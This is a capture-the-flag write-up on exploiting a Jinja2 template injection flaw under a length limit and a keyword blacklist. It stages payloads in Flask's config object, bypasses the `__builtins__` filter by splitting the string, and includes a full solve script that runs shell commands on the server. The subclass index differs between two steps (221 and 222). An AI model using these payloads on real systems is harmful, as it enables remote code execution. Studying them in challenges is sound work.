## About the Challenge

This is a **SSTI challenge** with blacklisted characters and a limited payload length. We are greeted with the following page with an input field:

![sstigolf1](/static/writeups/photos/sstigolf1.png)

From the name, we can guess that this is a **Server-Side Template Injection (SSTI)** challenge. We can test this by inputting `{{7*7}}` into the input field. This returns `49`, confirming that this is an SSTI challenge:

![sstigolf2](/static/writeups/photos/sstigolf2.png)

## Examining the Code

The source code is provided for this challenge:

```python
@app.route("/greet", methods=["POST"])
def greet():
    blacklist=['cycler','joiner','namespace','lipsum','globals','builtins','request']
    comment=request.form.get("comment")
    if len(comment)>65:
        return render_template("index.html",comment="That's kinda too much for a comment.")
    for i in blacklist:
        if i in comment.lower():
            print('builtins' in comment)
            return render_template("index.html",comment="I don't really like your comment. >:( ")
    return render_template_string(f"Damn. You like {comment}?")
```

We can see there is a **blacklist** of words not allowed in the payload: 

`cycler`, `joiner`, `namespace`, `lipsum`, `globals`, `builtins`, `request`. 

Additionally, the payload length is limited to **65 characters**.

### Approach

Searching for SSTI payloads with limited lengths, I came across [this article](https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/). The article details using the `config` object in Flask. The `config` object is global, meaning variables can be stored in the `config` object during one request and retrieved in another. This helps reduce payload length.

For instance:

```python
# First request to store the value 4 into the 'a' attribute of the config object.
{{config.update(a=2+2)}}

# Second request to retrieve the value of 'a'.
{{config.a}}
```

We can construct a series of payloads under 65 characters and store the required components of the exploit in the `config` object during successive requests.

## Solve Process

We return to the original payload used in a previous **babyssti** challenge to retrieve the flag:

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat flag.txt").read()}}{%endif%}{% endfor %}
```

The first step is to leak **`().__class__.__base__.__subclasses__()`** and find the class containing the string **`warning`** in its name. Luckily, this payload is under 65 characters:

```python
{{().__class__.__base__.__subclasses__()}}
```

Running this payload and finding the class with **`warning`** in its name reveals it is at index **222**.

### Storing Attributes in the `config` Object

To reduce payload lengths, we store attributes such as `__class__`, `__base__`, `__subclasses__`, and `__builtins__` in the `config` object. Since **`__builtins__`** is blacklisted, we bypass it by storing **`'__built'+'ins__'`** instead:

```python
payloads = [
    "{{config.update(a='__class__')}}",
    "{{config.update(b='__base__')}}",
    "{{config.update(c='__subclasses__')}}",
    "{{config.update(e='__built'+'ins__')}}"
]
```

### Storing Subclasses and Warning Object

Next, store all subclasses and the warning object:

```python
{{config.update(d=()[config.a][config.b][config.c])}}
{{config.update(f=config.d()[221]()._module[config.e])}}
```

### Importing the `os` Module

Import the `os` module and store it in the `config` object:

```python
{{config.update(g=config.f['__import__']('os'))}}
```

### Running the Exploit

Finally, use the `popen` command to read the flag:

```python
{{config.g.popen("cat flag.txt").read()}}
```

## Solve Script

```python
import requests 
url = "http://localhost:8000/greet"

def send_request(comment):
    response = requests.post(url, data={"comment": comment})
    return response.text

payloads = [
    "{{config.update(a='__class__')}}",
    "{{config.update(b='__base__')}}",
    "{{config.update(c='__subclasses__')}}",
    "{{config.update(e='__built'+'ins__')}}",
    "{{config.update(d=()[config.a][config.b][config.c])}}",
    "{{config.update(f=config.d()[222]()._module[config.e])}}",
    "{{config.update(g=config.f['__import__']('os'))}}",
    "{{config.g.popen('cat flag.txt').read()}}"
]

for payload in payloads:
    result = send_request(payload)
    print(result, payload)
```

## Flag

```text
blahaj{c0nf1g_v4r14bl35_f7w}
```

## Resources

- [Niebardzo's SSTI Article](https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/)
